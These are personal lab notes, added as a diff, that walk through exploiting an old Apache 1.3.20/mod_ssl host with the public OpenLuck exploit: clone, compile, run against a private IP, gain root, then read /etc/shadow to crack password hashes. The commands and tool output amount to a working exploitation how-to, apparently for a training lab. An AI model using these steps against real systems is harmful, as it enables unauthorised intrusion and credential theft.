@@ -33,3 +33,427 @@ msf6 >
 #run "set rhosts 192.168.3.4" use this to scan only one address
 # run this command "run" for it to start scanning or run "sploit"
 #all it does is to tell you whether an ip is open or close
+
+
+#Using metasploit to exploit some vulnerabilities that are found after scanning
+#I have found some vulnerabilities on a target host with apache, mod, open SSL etc
+#Aim: Use metasploit to exploit all these
+#First thing to be done- grab the vulnerabilies e.g apache 1.3.20 and go and google its exploits i.e
+Apache 1.3.20 exploits
+#There are several exploits for it- cve- security vulnaribilities, exploit database- openfuckv2.
+#to dig dipper on openfuckv2- it says apache needs to be less than 2.8.7, our vulnerability matches that
+#we have open ssl 2.8.6
+#if you scroll down, you might see some instructions on how to compile it.
+#you can do a page find to know more about what you want- do a page find for 1.3.20
+#e.g find it on redhat, run it on redhat and see if we get the exploits done.
+#there is another link for "openluck", it has more instructions, i can use that.
+#grab the github url for it-
+https://github.com/heltonWernik/OpenLuck
+#go to your machine and create a folder e.g mkdir jide
+#cd into the folder - cd jide
+#git clone the url into the folder . download i.e git clone https://github.com/heltonWernik/OpenLuck
+
+#output
+┌──(root㉿kali)-[/jide]
+└─# git clone https://github.com/heltonWernik/OpenLuck  
+Cloning into 'OpenLuck'...
+remote: Enumerating objects: 26, done.
+remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26
+Receiving objects: 100% (26/26), 14.14 KiB | 2.02 MiB/s, done.
+Resolving deltas: 100% (6/6), done.
+                                                                             
+┌──(root㉿kali)-[/jide]
+└─# 
+#install dev library next
+apt-get install libssl-dev
+#when i first ran this, i got an error -"Unable to locate package libssl-dev"
+#i went to google about the error and found out the version of kali i was running is the problem
+#i ran this command to find out if the lib is available- it is not available
+apt-cache search libssl
+#then i ran another to see if i am correctly configured repositories and i had
+apt-cache search libssl-dev
+#i did a sudo update and it worked
+sudo apt update
+#Output
+┌──(root㉿kali)-[~/jide]
+└─# apt-cache search libssl-dev
+libssl-dev - Secure Sockets Layer toolkit - development files
+perl-openssl-defaults - version compatibility baseline for Perl OpenSSL packages
+#Output
+┌──(root㉿kali)-[~/jide]
+└─# apt-cache search libssl                           
+cl-plus-ssl - Common Lisp interface to OpenSSL
+dcmtk - OFFIS DICOM toolkit command line utilities
+dlang-openssl - D version of the C headers for openssl
+libdcmtk-dev - OFFIS DICOM toolkit development libraries and headers
+libdcmtk17 - OFFIS DICOM toolkit runtime libraries
+libssl-dev - Secure Sockets Layer toolkit - development files
+libssl-doc - Secure Sockets Layer toolkit - development documentation
+libssl-ocaml - OCaml bindings for OpenSSL (runtime)
+libssl-ocaml-dev - OCaml bindings for OpenSSL
+libssl-utils-clojure - library for SSL certificate management on the JVM
+libssl3 - Secure Sockets Layer toolkit - shared libraries
+libunsafessl-dev - Secure Sockets Layer toolkit - development files - UNSAFE VERSION
+libunsafessl1.0.2 - Secure Sockets Layer toolkit - shared libraries - UNSAFE VERSION
+perl-openssl-defaults - version compatibility baseline for Perl OpenSSL packages
+r-cran-openssl - GNU R toolkit for encryption, signatures and certificates based on OpenSSL
+                                                                             
+┌──(root㉿kali)-[~/jide]
+└─# 
+#next step- once the lib file is installed, proceed to compile using gcc
+gcc -o OpenFuck OpenFuck.c -lcrypto
+#just follow the below steps to compile instead of running the gcc above straight away
+#do ls- it will show you an openluck foldeer
+ls
+#cd into the openluck folder
+cd openluck
+#run ls again
+ls
+#run gcc with other commands now i.e gcc openfuck.c, then -o, then give it a folder that you want, o is for output it
+gcc OpenFuck.c -o open -lcrypto
+
+#Output- it is deprecated
+┌──(root㉿kali)-[~/jide]
+└─# ls
+OpenLuck
+                                                                             
+┌──(root㉿kali)-[~/jide]
+└─# cd OpenLuck
+                                                                             
+┌──(root㉿kali)-[~/jide/OpenLuck]
+└─# ls
+OpenFuck.c  README.md
+                                                                             
+┌──(root㉿kali)-[~/jide/OpenLuck]
+└─# gcc OpenFuck.c -o open -lcrypto
+OpenFuck.c: In function ‘read_ssl_packet’:
+OpenFuck.c:866:17: warning: ‘RC4’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+  866 |                 RC4(ssl->rc4_read_key, rec_len, buf, buf);
+      |                 ^~~
+In file included from OpenFuck.c:24:
+/usr/include/openssl/rc4.h:37:28: note: declared here
+   37 | OSSL_DEPRECATEDIN_3_0 void RC4(RC4_KEY *key, size_t len,
+      |                            ^~~
+OpenFuck.c: In function ‘send_ssl_packet’:
+OpenFuck.c:915:17: warning: ‘MD5_Init’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+  915 |                 MD5_Init(&ctx);
+      |                 ^~~~~~~~
+In file included from OpenFuck.c:25:
+/usr/include/openssl/md5.h:49:27: note: declared here
+   49 | OSSL_DEPRECATEDIN_3_0 int MD5_Init(MD5_CTX *c);
+      |                           ^~~~~~~~
+OpenFuck.c:916:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+  916 |                 MD5_Update(&ctx, ssl->write_key, RC4_KEY_LENGTH);
+      |                 ^~~~~~~~~~
+/usr/include/openssl/md5.h:50:27: note: declared here
+   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
+      |                           ^~~~~~~~~~
+OpenFuck.c:917:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+  917 |                 MD5_Update(&ctx, rec, rec_len);
+      |                 ^~~~~~~~~~
+/usr/include/openssl/md5.h:50:27: note: declared here
+   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
+      |                           ^~~~~~~~~~
+OpenFuck.c:918:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+  918 |                 MD5_Update(&ctx, &seq, 4);
+      |                 ^~~~~~~~~~
+/usr/include/openssl/md5.h:50:27: note: declared here
+   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
+      |                           ^~~~~~~~~~
+OpenFuck.c:919:17: warning: ‘MD5_Final’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+  919 |                 MD5_Final(p, &ctx);
+      |                 ^~~~~~~~~
+/usr/include/openssl/md5.h:51:27: note: declared here
+   51 | OSSL_DEPRECATEDIN_3_0 int MD5_Final(unsigned char *md, MD5_CTX *c);
+      |                           ^~~~~~~~~
+OpenFuck.c:926:17: warning: ‘RC4’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+  926 |                 RC4(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);
+      |                 ^~~
+/usr/include/openssl/rc4.h:37:28: note: declared here
+   37 | OSSL_DEPRECATEDIN_3_0 void RC4(RC4_KEY *key, size_t len,
+      |                            ^~~
+OpenFuck.c: In function ‘send_client_master_key’:
+OpenFuck.c:1081:9: warning: ‘EVP_PKEY_get1_RSA’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+ 1081 |         if (EVP_PKEY_get1_RSA(pkey) == NULL) {
+      |         ^~
+In file included from /usr/include/openssl/x509.h:29,
+                 from /usr/include/openssl/ssl.h:31,
+                 from OpenFuck.c:19:
+/usr/include/openssl/evp.h:1348:16: note: declared here
+ 1348 | struct rsa_st *EVP_PKEY_get1_RSA(EVP_PKEY *pkey);
+      |                ^~~~~~~~~~~~~~~~~
+OpenFuck.c:1088:9: warning: ‘RSA_public_encrypt’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+ 1088 |         encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);
+      |         ^~~~~~~~~~~~~~~~~~~~
+In file included from /usr/include/openssl/x509.h:36:
+/usr/include/openssl/rsa.h:282:5: note: declared here
+  282 | int RSA_public_encrypt(int flen, const unsigned char *from, unsigned char *to,
+      |     ^~~~~~~~~~~~~~~~~~
+OpenFuck.c:1088:9: warning: ‘EVP_PKEY_get1_RSA’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+ 1088 |         encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);
+      |         ^~~~~~~~~~~~~~~~~~~~
+/usr/include/openssl/evp.h:1348:16: note: declared here
+ 1348 | struct rsa_st *EVP_PKEY_get1_RSA(EVP_PKEY *pkey);
+      |                ^~~~~~~~~~~~~~~~~
+OpenFuck.c: In function ‘generate_key_material’:
+OpenFuck.c:1125:17: warning: ‘MD5_Init’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+ 1125 |                 MD5_Init(&ctx);
+      |                 ^~~~~~~~
+/usr/include/openssl/md5.h:49:27: note: declared here
+   49 | OSSL_DEPRECATEDIN_3_0 int MD5_Init(MD5_CTX *c);
+      |                           ^~~~~~~~
+OpenFuck.c:1127:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+ 1127 |                 MD5_Update(&ctx,ssl->master_key,RC4_KEY_LENGTH);
+      |                 ^~~~~~~~~~
+/usr/include/openssl/md5.h:50:27: note: declared here
+   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
+      |                           ^~~~~~~~~~
+OpenFuck.c:1128:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+ 1128 |                 MD5_Update(&ctx,&c,1);
+      |                 ^~~~~~~~~~
+/usr/include/openssl/md5.h:50:27: note: declared here
+   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
+      |                           ^~~~~~~~~~
+OpenFuck.c:1130:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+ 1130 |                 MD5_Update(&ctx,ssl->challenge,CHALLENGE_LENGTH);
+      |                 ^~~~~~~~~~
+/usr/include/openssl/md5.h:50:27: note: declared here
+   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
+      |                           ^~~~~~~~~~
+OpenFuck.c:1131:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+ 1131 |                 MD5_Update(&ctx,ssl->conn_id, ssl->conn_id_length);
+      |                 ^~~~~~~~~~
+/usr/include/openssl/md5.h:50:27: note: declared here
+   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
+      |                           ^~~~~~~~~~
+OpenFuck.c:1132:17: warning: ‘MD5_Final’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+ 1132 |                 MD5_Final(km,&ctx);
+      |                 ^~~~~~~~~
+/usr/include/openssl/md5.h:51:27: note: declared here
+   51 | OSSL_DEPRECATEDIN_3_0 int MD5_Final(unsigned char *md, MD5_CTX *c);
+      |                           ^~~~~~~~~
+OpenFuck.c: In function ‘generate_session_keys’:
+OpenFuck.c:1141:9: warning: ‘RC4_set_key’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+ 1141 |         RC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);
+      |         ^~~~~~~~~~~
+/usr/include/openssl/rc4.h:35:28: note: declared here
+   35 | OSSL_DEPRECATEDIN_3_0 void RC4_set_key(RC4_KEY *key, int len,
+      |                            ^~~~~~~~~~~
+OpenFuck.c:1145:9: warning: ‘RC4_set_key’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
+ 1145 |         RC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);
+      |         ^~~~~~~~~~~
+/usr/include/openssl/rc4.h:35:28: note: declared here
+   35 | OSSL_DEPRECATEDIN_3_0 void RC4_set_key(RC4_KEY *key, int len,
+
+#when i checked for the open folder i asked it to output it to- i get it and it is green, which means it is executable
+┌──(root㉿kali)-[~/jide/OpenLuck]
+└─# ls
+open  OpenFuck.c  README.md
+                                                                             
+┌──(root㉿kali)-[~/jide/OpenLuck]
+└─# 
+#run ./open next
+./open
+
+#Output- gives me some readings
+┌──(root㉿kali)-[~/jide/OpenLuck]
+└─# ./open                             
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+: Usage: ./open target box [port] [-c N]
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port for ssl connection
+  -c open N connections. (use range 40-50 if u dont know)
+  
+
+  Supported OffSet:
+        0x00 - Caldera OpenLinux (apache-1.3.26)
+        0x01 - Cobalt Sun 6.0 (apache-1.3.12)
+        0x02 - Cobalt Sun 6.0 (apache-1.3.20)
+        0x03 - Cobalt Sun x (apache-1.3.26)
+        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)
+        0x05 - Conectiva 4 (apache-1.3.6)
+        0x06 - Conectiva 4.1 (apache-1.3.9)
+        0x07 - Conectiva 6 (apache-1.3.14)
+        0x08 - Conectiva 7 (apache-1.3.12)
+        0x09 - Conectiva 7 (apache-1.3.19)
+        0x0a - Conectiva 7/8 (apache-1.3.26)
+        0x0b - Conectiva 8 (apache-1.3.22)
+        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)
+        0x0d - Debian GNU Linux (apache_1.3.19-1)
+        0x0e - Debian GNU Linux (apache_1.3.22-2)
+        0x0f - Debian GNU Linux (apache-1.3.22-2.1)
+        0x10 - Debian GNU Linux (apache-1.3.22-5)
+        0x11 - Debian GNU Linux (apache_1.3.23-1)
+        0x12 - Debian GNU Linux (apache_1.3.24-2.1)
+        0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)
+        0x14 - Debian GNU Linux (apache_1.3.24-3)
+        0x15 - Debian GNU Linux (apache-1.3.26-1)
+        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)
+        0x17 - Debian GNU Linux (apache-1.3.27)
+        0x18 - FreeBSD (apache-1.3.9)
+        0x19 - FreeBSD (apache-1.3.11)
+        0x1a - FreeBSD (apache-1.3.12.1.40)
+        0x1b - FreeBSD (apache-1.3.12.1.40)
+        0x1c - FreeBSD (apache-1.3.12.1.40)
+        0x1d - FreeBSD (apache-1.3.12.1.40_1)
+        0x1e - FreeBSD (apache-1.3.12)
+        0x1f - FreeBSD (apache-1.3.14)
+        0x20 - FreeBSD (apache-1.3.14)
+        0x21 - FreeBSD (apache-1.3.14)
+        0x22 - FreeBSD (apache-1.3.14)
+        0x23 - FreeBSD (apache-1.3.14)
+        0x24 - FreeBSD (apache-1.3.17_1)
+        0x25 - FreeBSD (apache-1.3.19)
+        0x26 - FreeBSD (apache-1.3.19_1)
+        0x27 - FreeBSD (apache-1.3.20)
+        0x28 - FreeBSD (apache-1.3.20)
+        0x29 - FreeBSD (apache-1.3.20+2.8.4)
+        0x2a - FreeBSD (apache-1.3.20_1)
+        0x2b - FreeBSD (apache-1.3.22)
+        0x2c - FreeBSD (apache-1.3.22_7)
+        0x2d - FreeBSD (apache_fp-1.3.23)
+        0x2e - FreeBSD (apache-1.3.24_7)
+        0x2f - FreeBSD (apache-1.3.24+2.8.8)
+        0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)
+        0x31 - FreeBSD 4.6-Realease (apache-1.3.26)
+        0x32 - FreeBSD (apache-1.3.27)
+        0x33 - Gentoo Linux (apache-1.3.24-r2)
+        0x34 - Linux Generic (apache-1.3.14)
+        0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)
+        0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)
+        0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)
+        0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)
+        0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2
+        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
+        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
+        0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)
+        0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)
+        0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)
+        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
+        0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)
+        0x41 - Mandrake Linux 8.2 #2 (apache-1.3.23-4)
+        0x42 - Mandrake Linux 8.2 (apache-1.3.24)
+        0x43 - Mandrake Linux 9 (apache-1.3.26)
+        0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)
+        0x45 - RedHat Linux TEST1 (apache-1.3.12-1)
+        0x46 - RedHat Linux TEST2 (apache-1.3.12-1)
+        0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)
+        0x48 - RedHat Linux 4.2 (apache-1.1.3-3)
+        0x49 - RedHat Linux 5.0 (apache-1.2.4-4)
+        0x4a - RedHat Linux 5.1-Update (apache-1.2.6)
+        0x4b - RedHat Linux 5.1 (apache-1.2.6-4)
+        0x4c - RedHat Linux 5.2 (apache-1.3.3-1)
+        0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)
+        0x4e - RedHat Linux 6.0 (apache-1.3.6-7)
+        0x4f - RedHat Linux 6.0 (apache-1.3.6-7)
+        0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)
+        0x51 - RedHat Linux 6.0 Update (apache-1.3.24)
+        0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1
+        0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2
+        0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)
+        0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)
+        0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1
+        0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2
+        0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3
+        0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1
+        0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2
+        0x5b - Redhat Linux 7.x (apache-1.3.22)
+        0x5c - RedHat Linux 7.x (apache-1.3.26-1)
+        0x5d - RedHat Linux 7.x (apache-1.3.27)
+        0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1
+        0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2
+        0x60 - RedHat Linux 7.0 (apache-1.3.14-2)
+        0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)
+        0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)
+        0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)
+        0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1
+        0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2
+        0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)
+        0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)
+        0x68 - RedHat Linux 7.1 (apache-1.3.22-src)
+        0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)
+        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+        0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)
+        0x6d - RedHat Linux 7.2 (apache-1.3.24)
+        0x6e - RedHat Linux 7.2 (apache-1.3.26)
+        0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)
+        0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1
+        0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2
+        0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)
+        0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1
+        0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2
+        0x75 - RedHat Linux 7.3 (apache-1.3.27)
+        0x76 - RedHat Linux 8.0 (apache-1.3.27)
+        0x77 - RedHat Linux 8.0-second (apache-1.3.27)
+        0x78 - RedHat Linux 8.0 (apache-2.0.40)
+        0x79 - Slackware Linux 4.0 (apache-1.3.6)
+        0x7a - Slackware Linux 7.0 (apache-1.3.9)
+        0x7b - Slackware Linux 7.0 (apache-1.3.26)
+        0x7c - Slackware 7.0  (apache-1.3.26)2
+        0x7d - Slackware Linux 7.1 (apache-1.3.12)
+        0x7e - Slackware Linux 8.0 (apache-1.3.20)
+        0x7f - Slackware Linux 8.1 (apache-1.3.24)
+        0x80 - Slackware Linux 8.1 (apache-1.3.26)
+        0x81 - Slackware Linux 8.1-stable (apache-1.3.26)
+        0x82 - Slackware Linux (apache-1.3.27)
+        0x83 - SuSE Linux 7.0 (apache-1.3.12)
+        0x84 - SuSE Linux 7.1 (apache-1.3.17)
+        0x85 - SuSE Linux 7.2 (apache-1.3.19)
+        0x86 - SuSE Linux 7.3 (apache-1.3.20)
+        0x87 - SuSE Linux 8.0 (apache-1.3.23)
+        0x88 - SUSE Linux 8.0 (apache-1.3.23-120)
+        0x89 - SuSE Linux 8.0 (apache-1.3.23-137)
+        0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)
+
+Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
+                                                                             
+┌──(root㉿kali)-[~/jide/OpenLuck]
+└─# 
+#run the syntax given next
+./open target box [port] [-c N]
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port for ssl connection
+  -c open N connections. (use range 40-50 if u dont know)
+
+#look for the redhat version you are using- 7.2 1.3.20 for apache in the readings- 2 options
+        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+#i tried the b first
+#run
+#./open 0x6b $the ip of the targeted machine -c 40 i.e
+./open 0x6b 192.168.202.130 -c 40
+
+#once connected, run whoami
+whoami
+#run hostname next
+hostname
+#it should tell you the root and the name of the targeted host for whoami and hostname
+#YOU HAVE JUST EXPLOITED THE MACHINE
+
+#POST EXPLOITATION - ENUMERATION
+#Look at network commands first
+arp -a  #this does not run on it (command not found)
+route   #this does not run on it (command not found)
+sudo -l #this appears to run on it
+pwd
+
+#do etc passowrd, by cat - this is the crown jewel
+cat /etc/shadow
+#I have got a root hash and some users hashes
+#take the hashes, extract the etc password files and combine them to unshadow have gain access(uncrack) to one of the users
+
